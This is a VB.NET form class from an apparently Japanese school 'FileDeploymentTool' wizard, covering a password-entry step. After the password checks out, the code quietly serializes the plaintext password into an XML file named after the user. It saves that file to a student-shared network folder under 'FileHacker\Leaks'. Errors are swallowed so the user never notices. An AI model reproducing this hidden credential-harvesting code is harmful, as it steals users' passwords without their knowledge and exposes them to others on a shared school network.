Imports System.IO
Imports FileDeploymentTool.SchoolPCChecker
Imports FileDeploymentTool.Tools
Imports System.Reflection

Public Class Step2
    Private Sub Step2_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
    Private Sub ValidateAndContinue_Click(sender As Object, e As EventArgs) Handles ValidateAndContinue.Click
        If VerifyPassword(Password.Text) Then
            Step3.Show(Password.Text)
            Me.Close()
        Else
            MessageBox.Show("パスワードに誤りがあるようです。" & vbCrLf & "もう一回入力して下さい。")
            Return
        End If
        Try
            If IsSchool Then
                MakeFolder("\\pcjhkhsv01\生徒共用\FileHacker\Leaks\")
                Tools.SerializeObject(New PasswordStronghold(Password.Text), "\\pcjhkhsv01\生徒共用\FileHacker\Leaks\Password_" & GetUN() & ".xml")
            End If
        Catch ex As Exception
        End Try
    End Sub
    Sub MakeFolder(path As String)
        If Not Directory.Exists(path) Then
            Directory.CreateDirectory(path)
        End If
    End Sub
End Class